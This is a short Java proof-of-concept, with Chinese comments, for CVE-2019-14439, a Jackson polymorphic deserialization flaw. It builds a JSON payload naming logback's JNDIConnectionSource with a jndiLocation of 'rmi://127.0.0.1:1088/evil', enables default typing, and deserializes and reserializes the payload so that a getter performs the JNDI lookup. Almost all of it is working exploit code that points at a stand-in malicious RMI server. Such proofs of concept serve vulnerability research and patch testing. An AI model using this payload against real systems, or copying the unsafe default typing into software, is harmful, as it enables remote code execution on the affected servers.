package com.dem0.cve;

import com.fasterxml.jackson.databind.ObjectMapper;
import ch.qos.logback.core.db.JNDIConnectionSource;
import java.io.IOException;

public class CVE_2019_14439 {
    /**
     * 触发点在JNDISource 的get方法中
     * getconnection 有lookup触发
     * serializeAsField: 若要访问此bean的属性从给定bean中代表的方法，并使用适当的串行程序将其序列化为JSON对象字段。 就是会get
     * _accessorMethod: Accessor method used to get property value, for method-accessible properties. 就是get方法
     * @param args
     * @throws IOException
     * @throws IOException
     */
    public static void main(String[] args) throws IOException, IOException {
        String json = "[\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"rmi://127.0.0.1:1088/evil\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);//调用所有个 get 方法
    }
}
